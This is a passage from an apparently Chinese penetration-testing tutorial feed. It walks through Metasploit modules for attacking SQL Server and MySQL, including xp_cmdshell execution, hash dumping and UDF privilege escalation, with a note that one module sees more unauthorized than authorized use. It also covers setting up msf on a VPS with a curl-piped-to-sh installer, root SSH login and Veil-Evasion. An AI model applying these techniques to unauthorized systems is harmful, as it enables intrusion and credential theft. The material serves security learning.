resSet.Tables[0];</span><br><span class="line">DgData.DataBind();</span><br><span class="line"><span class="xml">Response.Write("sql:<span class="tag">&lt;<span class="name">br</span>&gt;</span>"+sql);</span></span><br><span class="line"><span class="xml">Response.Write("<span class="tag">&lt;<span class="name">br</span>&gt;</span>Result:");</span></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"> <span class="tag">&lt;/<span class="name">script</span>&gt;</span> </span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">xmlns</span>=<span class="string">"http://www.w3.org/1999/xhtml"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span> <span class="attr">runat</span>=<span class="string">"server"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http</span>‐<span class="attr">equiv</span>=<span class="string">"Content‐Type"</span> <span class="attr">content</span>=<span class="string">"text/html; charset=utf‐8"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">"form1"</span> <span class="attr">runat</span>=<span class="string">"server"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span> </span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">asp:DataGrid</span> <span class="attr">ID</span>=<span class="string">"DgData"</span> <span class="attr">runat</span>=<span class="string">"server"</span> <span class="attr">BackColor</span>=<span class="string">"White"</span> <span class="attr">BorderColor</span>=<span class="string">"#3366CC"</span></span></span><br><span class="line"><span class="tag"><span class="attr">BorderStyle</span>=<span class="string">"None"</span> <span class="attr">BorderWidth</span>=<span class="string">"1px"</span> <span class="attr">CellPadding</span>=<span class="string">"4"</span></span></span><br><span class="line"><span class="tag"><span class="attr">HeaderStyle</span>‐<span class="attr">CssClass</span>=<span class="string">"head"</span> <span class="attr">Width</span>=<span class="string">"203px"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">FooterStyle</span> <span class="attr">BackColor</span>=<span class="string">"#99CCCC"</span> <span class="attr">ForeColor</span>=<span class="string">"#003399"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">SelectedItemStyle</span> <span class="attr">BackColor</span>=<span class="string">"#009999"</span> <span class="attr">Font</span>‐<span class="attr">Bold</span>=<span class="string">"True"</span> <span class="attr">ForeColor</span>=<span class="string">"#CCFF99"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">PagerStyle</span> <span class="attr">BackColor</span>=<span class="string">"#99CCCC"</span> <span class="attr">ForeColor</span>=<span class="string">"#003399"</span> <span class="attr">HorizontalAlign</span>=<span class="string">"Left"</span> <span class="attr">Mode</span>=<span class="string">"NumericPages"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">ItemStyle</span> <span class="attr">BackColor</span>=<span class="string">"White"</span> <span class="attr">ForeColor</span>=<span class="string">"#003399"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">HeaderStyle</span> <span class="attr">CssClass</span>=<span class="string">"head"</span> <span class="attr">BackColor</span>=<span class="string">"#003399"</span> <span class="attr">Font</span>‐<span class="attr">Bold</span>=<span class="string">"True"</span> <span class="attr">Fore</span></span></span><br><span class="line"><span class="tag"><span class="attr">Color</span>=<span class="string">"#CCCCFF"</span>&gt;</span><span class="tag">&lt;/<span class="name">HeaderStyle</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">asp:DataGrid</span>&gt;</span> </span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>Micropoor</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Micro8 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>34、攻击SqlServer服务</title>
      <link href="/article/34_%E6%94%BB%E5%87%BBSqlServer%E6%9C%8D%E5%8A%A1.html"/>
      <url>/article/34_%E6%94%BB%E5%87%BBSqlServer%E6%9C%8D%E5%8A%A1.html</url>
      
        <content type="html"><![CDATA[<p>msf 内置关于 mssql 插件如下（部分非测试mssql 插件）<br><img src="../do/media/14d4b2ef52542a9214714790bb6814bd.jpg" alt></p><p>关于msf常用攻击mssql插件如下：  </p><ol><li>auxiliary/admin/mssql/mssql_enum  </li><li>auxiliary/admin/mssql/mssql_enum_sql_logins  </li><li>auxiliary/admin/mssql/mssql_escalate_dbowner  </li><li>auxiliary/admin/mssql/mssql_exec  </li><li>auxiliary/admin/mssql/mssql_sql  </li><li>auxiliary/admin/mssql/mssql_sql_file  </li><li>auxiliary/scanner/mssql/mssql_hashdump  </li><li>auxiliary/scanner/mssql/mssql_login  </li><li>auxiliary/scanner/mssql/mssql_ping  </li><li>exploit/windows/mssql/mssql_payload  </li><li>post/windows/manage/mssql_local_auth_bypass</li></ol><p>本地靶机测试：<br>x86 windows 2003 ip:192.168.1.115<br><img src="../do/media/53d6d9288fecdd2e130300f85c918fde.jpg" alt></p><h3 id="1-auxiliary-admin-mssql-mssql-enum"><a href="#1-auxiliary-admin-mssql-mssql-enum" class="headerlink" title="1. auxiliary/admin/mssql/mssql_enum"></a>1. auxiliary/admin/mssql/mssql_enum</h3><p>非常详细的目标机Sql server 信息：<br><img src="../do/media/811bc0093d66031f0e18375fa737a07c.jpg" alt><br><img src="../do/media/311969e0450cb1458a954f92b02d2088.jpg" alt></p><h3 id="2-auxiliary-admin-mssql-mssql-enum-sql-logins"><a href="#2-auxiliary-admin-mssql-mssql-enum-sql-logins" class="headerlink" title="2.auxiliary/admin/mssql/mssql_enum_sql_logins"></a>2.auxiliary/admin/mssql/mssql_enum_sql_logins</h3><p>枚举sql logins，速度较慢，不建议使用。<br><img src="../do/media/c2f4ae385eeee038db62565323c03853.jpg" alt></p><h3 id="3-auxiliary-admin-mssql-mssql-escalate-dbowner"><a href="#3-auxiliary-admin-mssql-mssql-escalate-dbowner" class="headerlink" title="3.auxiliary/admin/mssql/mssql_escalate_dbowner"></a>3.auxiliary/admin/mssql/mssql_escalate_dbowner</h3><p>发现dbowner，当sa无法得知密码的时候，或者需要其他账号提供来支撑下一步的内网渗透。<br><img src="../do/media/7edd4d6780a48d93d787f59296c85928.jpg" alt></p><h3 id="4-auxiliary-admin-mssql-mssql-exec"><a href="#4-auxiliary-admin-mssql-mssql-exec" class="headerlink" title="4.auxiliary/admin/mssql/mssql_exec"></a>4.auxiliary/admin/mssql/mssql_exec</h3><p>最常用模块之一，当没有激活xp_cmdshell，自动激活。并且调用执行cmd命令。权限继承 Sql server。<br><img src="../do/media/3759eb9026a6b73dcd9e3a3a582cbf8b.jpg" alt></p><h3 id="5-auxiliary-admin-mssql-mssql-sql"><a href="#5-auxiliary-admin-mssql-mssql-sql" class="headerlink" title="5.auxiliary/admin/mssql/mssql_sql"></a>5.auxiliary/admin/mssql/mssql_sql</h3><p>最常用模块之一，如果熟悉Sql server 数据库特性，以及sql语句。建议该模块，更稳定。</p><p><img src="../do/media/a8d69a38790844c0b37057687853064e.jpg" alt></p><h3 id="6-auxiliary-admin-mssql-mssql-sql-file"><a href="#6-auxiliary-admin-mssql-mssql-sql-file" class="headerlink" title="6.auxiliary/admin/mssql/mssql_sql_file"></a>6.auxiliary/admin/mssql/mssql_sql_file</h3><p>当需要执行多条sql语句的时候，或者非常复杂。msf本身支持执行sql文件。授权渗透应用较少，非授权应用较多的模块。  </p><p><img src="../do/media/8cf7347d1403235e63419c9c4e461c1e.jpg" alt></p><h3 id="7-auxiliary-scanner-mssql-mssql-hashdump"><a href="#7-auxiliary-scanner-mssql-mssql-hashdump" class="headerlink" title="7.auxiliary/scanner/mssql/mssql_hashdump"></a>7.auxiliary/scanner/mssql/mssql_hashdump</h3><p>mssql的hash导出。如果熟悉sql语句。也可以用mssql_sql模块来执行。</p><p><img src="../do/media/1ac1d8066a613adab1f09e0d6d707ab6.jpg" alt>  </p><p><img src="../do/media/e2c5ee21db0a1a811c9333331312abb7.jpg" alt></p><h3 id="8-auxiliary-scanner-mssql-mssql-login"><a href="#8-auxiliary-scanner-mssql-mssql-login" class="headerlink" title="8.auxiliary/scanner/mssql/mssql_login"></a>8.auxiliary/scanner/mssql/mssql_login</h3><p>内网渗透中的常用模块之一，支持RHOSTS，来批量发现内网mssql主机。mssql的特性除了此种方法。还有其他方法来专门针对mssql主机发现，以后得季会提到。<br><img src="../do/media/6e7aaf7b86627694ee979784cc8aaa7c.jpg" alt></p><h3 id="9-auxiliary-scanner-mssql-mssql-ping"><a href="#9-auxiliary-scanner-mssql-mssql-ping" class="headerlink" title="9.auxiliary/scanner/mssql/mssql_ping"></a>9.auxiliary/scanner/mssql/mssql_ping</h3><p>查询mssql 实例，实战中，应用较少。信息可能不准确。  </p><p><img src="../do/media/cf3c52e619f19e45e2266648279a0f0d.jpg" alt></p><h3 id="10-exploit-windows-mssql-mssql-payload"><a href="#10-exploit-windows-mssql-mssql-payload" class="headerlink" title="10.exploit/windows/mssql/mssql_payload"></a>10.exploit/windows/mssql/mssql_payload</h3><p>非常好的模块之一，在实战中。针对不同时间版本的系统都有着自己独特的方式来上传payload。  </p><p><img src="../do/media/f38228156f2a8c7285c2bb48b6105ef0.jpg" alt></p><p><strong>注：由于本季的靶机是 windows 2003，故参数set method old，如果本次的参数为cmd，那么payload将会失败。</strong></p><p><img src="../do/media/5826f503abb5f2108d0d392b3c6d9f6d.jpg" alt></p><h3 id="11-post-windows-manage-mssql-local-auth-bypass"><a href="#11-post-windows-manage-mssql-local-auth-bypass" class="headerlink" title="11.post/windows/manage/mssql_local_auth_bypass"></a>11.post/windows/manage/mssql_local_auth_bypass</h3><p>post模块都属于后渗透模块，不属于本季内容。未来的系列。会主讲post类模块。</p><blockquote><p>  后者的话：<br>在内网横向渗透中，需要大量的主机发现来保证渗透的过程。而以上的插件，在内网横向或者Sql server主机发现的过程中，尤为重要。与Mysql 不同的是，在Sql server的模块中，一定要注意参数的配备以及payload的组合。否则无法反弹payload。</p></blockquote><blockquote><p>  Micropoor</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Micro8 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>33、攻击Mysql服务</title>
      <link href="/article/33_%E6%94%BB%E5%87%BBMysql%E6%9C%8D%E5%8A%A1.html"/>
      <url>/article/33_%E6%94%BB%E5%87%BBMysql%E6%9C%8D%E5%8A%A1.html</url>
      
        <content type="html"><![CDATA[<p>msf 内置关于mysql插件如下（部分非测试mysql 插件）<br><img src="../do/media/876ad30bffd3f57b961ecb2781f888fc.jpg" alt></p><p>关于msf常用攻击mysql插件如下：  </p><ol><li>auxiliary/scanner/mysql/mysql_login  </li><li>exploit/multi/mysql/mysql_udf_payload  </li><li>exploit/windows/mysql/mysql_mof  </li><li>exploit/windows/mysql/scrutinizer_upload_exec  </li><li>auxiliary/scanner/mysql/mysql_hashdump  </li><li>auxiliary/admin/mysql/mysql_sql  </li><li>auxiliary/scanner/mysql/mysql_version</li></ol><p>以下本地靶机测试：<br>靶机1：x86 Windows7  </p><p><img src="../do/media/ff8b69c7beb814d667497bbc433cfaaa.jpg" alt></p><p>靶机2 ：<br>x86 windows 2003 ip:192.168.1.115<br><img src="../do/media/5692738d486e9997fe0752e7e6be1c9f.jpg" alt></p><h3 id="1、auxiliary-scanner-mysql-mysql-login"><a href="#1、auxiliary-scanner-mysql-mysql-login" class="headerlink" title="1、auxiliary/scanner/mysql/mysql_login"></a>1、auxiliary/scanner/mysql/mysql_login</h3><p>常用于内网中的批量以及单主机的登录测试。<br><img src="../do/media/c9f16b174fa0a7b4f67c75b3ed9f2492.jpg" alt></p><h3 id="2、exploit-multi-mysql-mysql-udf-payload"><a href="#2、exploit-multi-mysql-mysql-udf-payload" class="headerlink" title="2、exploit/multi/mysql/mysql_udf_payload"></a>2、exploit/multi/mysql/mysql_udf_payload</h3><p>常用于root启动的mysql 并root的udf提权。<br><img src="../do/media/9b06e9685123fd026cb108f9d281c05f.jpg" alt>  </p><p><img src="../do/media/8569841b55b9fd3bf0ed467eb4f9daf3.jpg" alt>  </p><p><img src="../do/media/0a4ac046fdc3e4d1f7d713ef14f1651c.jpg" alt></p><h3 id="3、exploit-windows-mysql-mysql-mof"><a href="#3、exploit-windows-mysql-mysql-mof" class="headerlink" title="3、exploit/windows/mysql/mysql_mof"></a>3、exploit/windows/mysql/mysql_mof</h3><p>以上类似，提权。<br><img src="../do/media/cc563fb9d228e4c7adaf7b284925dbf4.jpg" alt></p><h3 id="4、exploit-windows-mysql-scrutinizer-upload-exec"><a href="#4、exploit-windows-mysql-scrutinizer-upload-exec" class="headerlink" title="4、exploit/windows/mysql/scrutinizer_upload_exec"></a>4、exploit/windows/mysql/scrutinizer_upload_exec</h3><p>上传文件执行。</p><p><img src="../do/media/904116076e8cc90398e6769b4a8f0492.jpg" alt></p><h3 id="5、auxiliary-scanner-mysql-mysql-hashdump"><a href="#5、auxiliary-scanner-mysql-mysql-hashdump" class="headerlink" title="5、auxiliary/scanner/mysql/mysql_hashdump"></a>5、auxiliary/scanner/mysql/mysql_hashdump</h3><p>mysql的mysql.user表的hash<br><img src="../do/media/0ccc9d7da3cbd464b35662a431824eea.jpg" alt></p><p>而在实战中，mysql_hashdump这个插件相对其他较为少用。一般情况建议使用sql语句：<br>更直观，更定制化</p><p><img src="../do/media/8e1d6085009d34a2afbbab9f4bddd95f.jpg" alt></p><h3 id="6、auxiliary-admin-mysql-mysql-sql"><a href="#6、auxiliary-admin-mysql-mysql-sql" class="headerlink" title="6、auxiliary/admin/mysql/mysql_sql"></a>6、auxiliary/admin/mysql/mysql_sql</h3><p>执行sql语句。尤其是在目标机没有web界面等无法用脚本执行的环境。<br><img src="../do/media/42b5a61ec763f6c6dbd725650188e5ad.jpg" alt></p><p><img src="../do/media/f1fb35b04225b40e571c5e61f8516886.jpg" alt></p><h3 id="7、auxiliary-scanner-mysql-mysql-version"><a href="#7、auxiliary-scanner-mysql-mysql-version" class="headerlink" title="7、auxiliary/scanner/mysql/mysql_version"></a>7、auxiliary/scanner/mysql/mysql_version</h3><p>常用于内网中的批量mysql主机发现。</p><p><img src="../do/media/e9bfe12061674c64cdee00c7056173f1.jpg" alt></p><blockquote><p>  后者的话：<br>在内网横向渗透中，需要大量的主机发现来保证渗透的过程。而以上的插件，在内网横向或者mysql主机发现的过程中，尤为重要。</p></blockquote><blockquote><p>  Micropoor</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Micro8 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>32、配置vps上的msf</title>
      <link href="/article/32_%E9%85%8D%E7%BD%AEvps%E4%B8%8A%E7%9A%84msf.html"/>
      <url>/article/32_%E9%85%8D%E7%BD%AEvps%E4%B8%8A%E7%9A%84msf.html</url>
      
        <content type="html"><![CDATA[<p>许多教程都会讲解 msf 分别在 windows，linux 以及 Mac 上的安装，而在实际的项目中，或者实战中，居多以 vps 上做跳板渗透，而vps 又以 linux 居多。故本章直接以 linux 为安装背景。</p><h3 id="vps背景如下："><a href="#vps背景如下：" class="headerlink" title="vps背景如下："></a>vps背景如下：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@john:~# uname -a</span><br><span class="line">Linux john 3.16.0-7-amd64 #1 SMP Debian 3.16.59-1 (2018-10-03) x86_64 GNU/Linux</span><br><span class="line"></span><br><span class="line">root@john:~# lsb_release -a </span><br><span class="line">No LSB modules are available. </span><br><span class="line">Distributor ID: Debian</span><br><span class="line">Description: Debian GNU/Linux 8.11 (jessie)</span><br><span class="line">Release: 8.11 Codename: jessie</span><br><span class="line"></span><br><span class="line">root@john:~# cat /proc/version</span><br><span class="line">Linux version 3.16.0-7-amd64 (debian-kernel@lists.debian.org) (gcc version 4.9.2 (Debian 4.9.2-10+deb8u1) ) #1 SMP Debian 3.16.59-1 (2018-10-03)</span><br></pre></td></tr></table></figure><p>以Debian为载体，更能快速的安装与配置msf。</p><h3 id="安装："><a href="#安装：" class="headerlink" title="安装："></a>安装：</h3><p><strong>配置源</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">root@john:~# nano /etc/apt/sources.list</span><br><span class="line">root@john:~# cat /etc/apt/sources.list </span><br><span class="line">#</span><br><span class="line"># deb cdrom:[Debian GNU/Linux 8.11.0 _Jessie_ - Official amd64 NETINST Binary-1 20180623-13:06]/ jessie main</span><br><span class="line"></span><br><span class="line">#deb cdrom:[Debian GNU/Linux 8.11.0 _Jessie_ - Official amd64 NETINST Binary-1 20180623-13:06]/ jessie main</span><br><span class="line"></span><br><span class="line">deb http://http.us.debian.org/debian/ jessie main </span><br><span class="line">deb-src http://http.us.debian.org/debian/ jessie main</span><br><span class="line">deb http://security.debian.org/ jessie/updates main </span><br><span class="line">deb-src http://security.debian.org/ jessie/updates main</span><br><span class="line"></span><br><span class="line"># jessie-updates, previously known as &apos;volatile&apos;</span><br><span class="line">deb http://http.us.debian.org/debian/ jessie-updates main </span><br><span class="line">deb-src http://http.us.debian.org/debian/ jessie-updates main </span><br><span class="line">#deb http://http.kali.org/kali kali-rolling main non-free contrib</span><br><span class="line">#deb-src http://http.kali.org/kali kali-rolling main non-free contrib </span><br><span class="line">deb http://http.kali.org/kali kali-rolling main non-free contrib</span><br><span class="line">#deb http://http.kali.org/kali kali-rolling main non-free contrib</span><br></pre></td></tr></table></figure><p><img src="../do/media/e9b744f10cb5b2f1839df14aa5a0effd.jpg" alt></p><p><strong>更新源：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@john:~# apt-get update&amp;&amp;apt-get upgrade</span><br></pre></td></tr></table></figure><p>更新后故可apt 安装即可，方便快捷。  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">root@john:~# apt-get install metasploit-framework</span><br><span class="line">```  </span><br><span class="line">如安装sqlmap等。安装metasploit-framework，  </span><br><span class="line">![](../do/media/79cd811fb5297e51cea4b67c8610ed81.jpg)</span><br><span class="line"></span><br><span class="line">以此种方式安装，也无需在配置psql。可快速部署解决项目。  </span><br><span class="line">![](../do/media/bf8614f720c322b130eb82cb9b908bd0.jpg)</span><br><span class="line"></span><br><span class="line">**sqlmap**  </span><br><span class="line"> </span><br><span class="line">![](../do/media/cf91eb7b6ef1e0bb9bfd5415351c8b05.jpg)</span><br><span class="line"></span><br><span class="line">在虚拟机，多数存在几点问题  </span><br><span class="line">1. 配置后，ssh无法连接  </span><br><span class="line">2. 关于vmtools的问题  </span><br><span class="line">3. 虚拟机的vpn问题  </span><br><span class="line">4. U盘安装kali不能挂载的问题</span><br><span class="line"></span><br><span class="line">### 问题1：</span><br><span class="line">**配置SSH：**</span><br><span class="line">```code</span><br><span class="line">apt install ssh</span><br><span class="line">nano /etc/ssh/sshd_config #PasswordAuthentication no //修改yes</span><br><span class="line">#PermitRootLogin yes //修改yes</span><br><span class="line">service ssh start //重启</span><br><span class="line">/etc/init.d/ssh status //验证</span><br><span class="line">update-rc.d ssh enable //添加开机重启</span><br><span class="line">//运行ssh root登录</span><br><span class="line">#PermitRootLogin prohibit-password改为PermitRootLogin yes</span><br></pre></td></tr></table></figure><h3 id="问题2："><a href="#问题2：" class="headerlink" title="问题2："></a>问题2：</h3><p>更新源安装vmtool，文件头：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@john:~# apt-get install open-vm-tools-desktop fuse</span><br><span class="line">root@john:~#apt-cache search linux-headers //安装头文件</span><br><span class="line">root@john:~#apt-get install linux-image-4.9.0-kali3-amd64</span><br><span class="line">root@john:~#apt-get install linux-image-4.9.0 // </span><br><span class="line">root@john:~#apt-get install linux-headers-4.9.0-kali4-amd64 //重启</span><br><span class="line">root@john:~# apt-get install linux-headers-$(uname -r) //kali2.0以后vmtools不需要安装</span><br></pre></td></tr></table></figure><h3 id="问题3："><a href="#问题3：" class="headerlink" title="问题3："></a>问题3：</h3><p>安装各种VPN：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install -y pptpd network-manager-openvpn network-manager-openvpn-gnome network-manager-pptp network-manager-pptp-gnome network-manager-strongswan network-manager-vpnc network-manager-vpnc-gnome</span><br></pre></td></tr></table></figure><p>重启网卡即可。</p><h3 id="问题4："><a href="#问题4：" class="headerlink" title="问题4："></a>问题4：</h3><p>Kali U盘安装不能挂载：<br>第一步:df -m<br>此时会看到挂载信息，最下面的是/dev/XXX /media<br>这个是U盘设备挂载到了/media，导致cd-rom不能被挂载。</p><p>第二步:umount /media<br>上面那个国外的解决方案还要继续mount /dev/XXX /cd-rom<br>但本机测试不用自己挂载，安装程序会自己挂载。自己挂载反而会引起后面出现GRUB安装失败。</p><p>第三步：exit<br>退出命令窗口后，返回之前的语言选择，继续安装，现在不会再出现cd-rom无法挂载的情况了，安装顺利完成</p><p>在vps配置并更新好以上源时，按照项目或者任务在安装其他相关工具辅助。当不确定或者对某些工具遗忘时，可如下操作：<br><img src="../do/media/ae8ca52f637b5dbcbe46ee645ece188b.jpg" alt></p><p><img src="../do/media/6d12108af235a6bbe14219853368e6e2.jpg" alt></p><p><img src="../do/media/0d2695ee11149564874c293e95694a32.jpg" alt></p><p><img src="../do/media/2d20e16955814a3e80d207b82dbe4efd.jpg" alt></p><h3 id="配置zsh："><a href="#配置zsh：" class="headerlink" title="配置zsh："></a>配置zsh：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">sh -c &quot;\$(curl -fsSL https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh)&quot;</span><br><span class="line">chsh -s `which zsh` //设置默认为zsh</span><br><span class="line">cat /etc/shells //查看当前安装的shell</span><br><span class="line">echo $SHELL //查看当前使用shells</span><br><span class="line">```  </span><br><span class="line">![](../do/media/f40749ab07eff2a46329a15cd336adde.jpg)</span><br><span class="line"></span><br><span class="line">如果是 vps 不建议安装 oh-my-zsh，很多国外的 vps 延迟较多。我是配置zsh。</span><br><span class="line"></span><br><span class="line">wget https://raw.githubusercontent.com/skywind3000/vim/master/etc/zshrc.zsh</span><br><span class="line"></span><br><span class="line">把上面下载的文件复制粘贴到你的 ~/.zshrc 文件里，保存，运行 zsh 即可。头一次运行会安装一些依赖包，稍等两分钟，以后再进入就瞬间进入了。  </span><br><span class="line">![](../do/media/8948c3d06c5fdc00b21d09ce7bb5a682.jpg)</span><br><span class="line"></span><br><span class="line">如果不能tab补全：</span><br><span class="line">```code</span><br><span class="line">nano /root/.bashrc</span><br></pre></td></tr></table></figure><p>跳到最后一行，添加：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">if [ -f /etc/bash_completion ] &amp;&amp; ! shopt -oq posix; then </span><br><span class="line">    ./etc/bash_completion</span><br><span class="line">fi</span><br><span class="line">```  </span><br><span class="line">![](../do/media/1322a5fa5fcd3c122d4d01ea4709b12a.jpg)</span><br><span class="line"></span><br><span class="line">为msf payload添加第三方框架：（这未来会详细讲述，次季，仅是安装）</span><br><span class="line">```code</span><br><span class="line">root@John:~# apt-get install veil-evasion</span><br></pre></td></tr></table></figure><p><img src="../do/media/131cc238261aa2659355136046aa75cc.jpg" alt>  </p><p><img src="../do/media/6efdf3faa9859c2574261d63154b9ddc.jpg" alt>  </p><p>至此vps上的msf的初级配置结束。</p><p><strong>注：部分vps上没有安装mlocate，安装即可。</strong></p><p><img src="../do/media/be7a5c1840e1559b7df5a235f3b6f747.jpg" alt></p><blockquote><p>  Micropoor</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Micro8 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>31、msf的前生今世</title>
      <link href="/article/31_msf%E7%9A%84%E5%89%8D%E7%94%9F%E4%BB%8A%E4%B8%96.html"/>
      <url>/article/31_msf%E7%9A%84%E5%89%8D%E7%94%9F%E4%BB%8A%E4%B8%96.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>  The world’s most used penetration testing framework.  </p><p>  Metasploit</p></blockquote><p>从本季开始将会连载 Metasploit 教学，非常荣幸，本部门在我的“怂恿”下，基本以Metasploit 为常用框架做渗透。为了更好的把这个“坏习惯”延续下去，遂打算写一套完整的系列教程。以供同学们在使用中，或者新来的同学形成递归学习或者查询相关资料。在写的同时，查阅了大量的资料以及借鉴了许多思路。感谢为此贡献的老师们。</p><p>Metasploit 项目是一个旨在提供安全漏洞信息计算机安全项目，可以协助安全工程师进行渗透测试（penetration testing）及入侵检测系统签名开发。<br>Github开源地址：<a href="https://github.com/rapid7/metasploit-framework" target="_blank" rel="noopener">https://github.com/rapid7/metasploit-framework</a></p><p>msf（未来Metasploit的简称）基本遵循PTES渗透测试标准。它将渗透分解如下：</p><ol><li>创建项目</li><li>发现设备</li><li>获取对主机的访问权限</li><li>控制会话</li><li>从目标主机收集证据</li><li>会话清除</li><li>生成报告（需pro版本）</li></ol><h3 id="而PTEST渗透测试标准如下："><a href="#而PTEST渗透测试标准如下：" class="headerlink" title="而PTEST渗透测试标准如下："></a>而PTEST渗透测试标准如下：</h3><p>1：前期交互阶段<br>在前期交互（Pre-Engagement Interaction）阶段，渗透测试团队与客户组织进行交互讨论，最重要的是确定渗透测试的范围、目标、限制条件以及服务合同细节。</p><p>该阶段通常涉及收集客户需求、准备测试计划、定义测试范围与边界、定义业务目标、项目管理与规划等活动。</p><p>2：情报收集阶段<br>在目标范围确定之后，将进入情报搜集（Information Gathering）阶段，渗透测试团队可以利用各种信息来源与搜集技术方法，尝试获取更多关于目标组织网络拓扑、系统配置<br>与安全防御措施的信息。</p><p>渗透测试者可以使用的情报搜集方法包括公开来源信息查询、Google Hacking、社会工程学、网络踩点、扫描探测、被动监听、服务查点等。而对目标系统的情报探查能力是渗透测试者一项非常重要的技能，情报搜集是否充分在很大程度上决定了渗透测试的成败，因为如果你遗漏关键的情报信息，你将可能在后面的阶段里一无所获。</p><p>3：威胁建模阶段<br>在搜集到充分的情报信息之后，渗透测试团队的成员们停下敲击键盘，大家聚到一起针对获取的信息进行威胁建模（Threat Modeling）与攻击规划。这是渗透测试过程中非常重要，但很容易被忽视的一个关键点。</p><p>通过团队共同的缜密情报分析与攻击思路头脑风暴，可以从大量的信息情报中理清头绪，确定出最可行的攻击通道。</p><p>4：漏洞分析阶段<br>在确定出最可行的攻击通道之后，接下来需要考虑该如何取得目标系统的访问控制权，即漏洞分析（Vulnerability 